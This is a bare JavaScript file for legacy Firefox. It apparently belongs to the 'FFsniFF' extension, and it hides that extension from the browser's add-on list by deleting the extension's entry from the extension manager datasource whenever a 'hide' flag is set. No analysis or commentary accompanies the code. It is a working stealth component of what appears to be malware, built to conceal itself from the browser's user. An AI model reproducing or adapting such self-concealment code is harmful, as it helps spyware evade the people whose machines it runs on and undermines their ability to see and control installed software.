var enable_hide = "yes";
function hide_me() {
	var RDFService = Components.classes["@mozilla.org/rdf/rdf-service;1"].getService(Components.interfaces.nsIRDFService);
	var Container = Components.classes["@mozilla.org/rdf/container;1"].createInstance(Components.interfaces.nsIRDFContainer);
	var extensionDS = Components.classes["@mozilla.org/extensions/manager;1"].getService(Components.interfaces.nsIExtensionManager).datasource;
	var root = RDFService.GetResource("urn:mozilla:item:root");
	var nameArc = RDFService.GetResource("http://www.mozilla.org/2004/em-rdf#name");
	Container.Init(extensionDS, root);
	var elements = Container.GetElements();
	while (elements.hasMoreElements()) {
		var element = elements.getNext();
		var name = "";
		var target = extensionDS.GetTarget(element, nameArc, true);
		if (target) {
			name = target.QueryInterface(Components.interfaces.nsIRDFLiteral).Value;
			if (name == "FFsniFF") {
				Container.RemoveElement(element, true);
			}
		}
	}
}

if (enable_hide == "yes") {
	hide_me();
}
